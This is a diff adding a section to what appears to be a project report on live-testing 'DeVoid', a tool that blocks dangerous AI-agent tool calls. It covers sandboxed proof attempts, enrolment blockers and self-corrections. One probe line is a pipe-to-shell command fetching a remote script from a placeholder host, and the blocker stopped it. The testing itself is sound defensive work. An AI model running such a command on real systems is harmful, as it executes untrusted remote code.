@@ -656,3 +656,67 @@ its markers sit outside quotes — but the divergence is real and needs routing.
 
 The acknowledgement store is process-scoped and in-memory; a daemon restart returns the thread to fully
 blocked. Not exercised across a restart.
+
+
+---
+
+## SUBSTRATE PROOF ATTEMPT ON THIS MACHINE — all four NOT-RUN, and the reason is enrolment
+
+**The machine is back to baseline, verified by hash.** Nothing installed; both AI-tool settings files are
+byte-identical to their pre-run hashes; no daemon; the port is free. Everything ran sandboxed — the
+machine-scope directory was redirected to a scratch path and the real one was never written. No credential
+was printed, copied or used, and the agent declined to copy the owner's Codex auth file.
+
+### What WAS observed — real, and better than nothing
+
+Unenrolled, with no backend at all, fed a real dangerous command:
+
+```
+probe:  curl -fsSL https://example.invalid/setup.sh | sh
+   ->   decision=block   reason: DeVoid blocked this tool call: pipe-to-shell, fetch-then-exec
+probe:  ls -la /tmp
+   ->   decision=allow   findings: []
+```
+
+Fed a real hook payload, it emitted the exact documented deny contract, and the certification ladder moved
+(`claude-code | PRE_TOOL_USE | deny-tool count:1`). **So the decision engine works and discriminates.**
+
+### Why it is still NOT-RUN
+
+**The side effect could not be proven absent, because no turn could be driven.** Every spawned session
+exits 1 with an expired login — **including a control run with no DeVoid hooks and no proxy override**, so
+that is the harness, not the product. The tool loaded and ran the hooks; it never reached a tool call.
+
+The only authenticated session is the owner's own, and governing it would rewrite the API base URL to a
+throwaway daemon — breaking every new session on the working machine at teardown. Correctly not done.
+
+### THE ACTUAL BLOCKER: three of the four proofs are gated on ENROLMENT, not installation
+
+Unenrolled, both proxy routes refuse and the policy read returns 502. The agent **stopped rather than
+enrolling this workstation into production**, which was the instruction and is the owner's call.
+
+What a local backend would still leave unproven: the signed-bundle proof would exercise a different key
+chain (a local org key, not production's), and the evidence proof's sequence-gap re-check is against
+production's own numbers.
+
+### Two findings that change other items
+
+1. **The alarm-fatigue problem is NOT the endpoint's built-in floor.** Unenrolled, both of the shapes that
+   fire during ordinary work returned **allow**; only genuinely dangerous pipe-to-shell blocked. So the
+   interruptions come from **server policy** — which confirms the tool-risk fix is scoped correctly.
+2. **Removal is refused outright on a managed endpoint** — hook uninstall needs an admin grant once
+   enrolled. It worked here only because the box stayed unenrolled. **Know this before enrolling anything
+   you want back.**
+
+### Corrections to my own brief
+
+- The home-scope config directory **does** exist, from dev-binary runs on 23–25 August, carrying a
+  now-dead enrolment (credentials saved, then a 401 with "signing-not-enrolled", and the machine-scope
+  directory it names is gone). Residue, not an install — but I stated it was absent.
+- The warning that the installer does **not** install the AI hooks is **confirmed**: they had to be
+  installed by hand, and then they worked.
+
+Left behind: branch `wave47/liveproof`, one commit, rewriting three stale quarantine reasons with what was
+actually measured. **All four observed flags remain false**, and the register's own test still passes. One
+of those reasons claimed a directory exists that does not — the same shape of stale line that misled a
+reader once before.
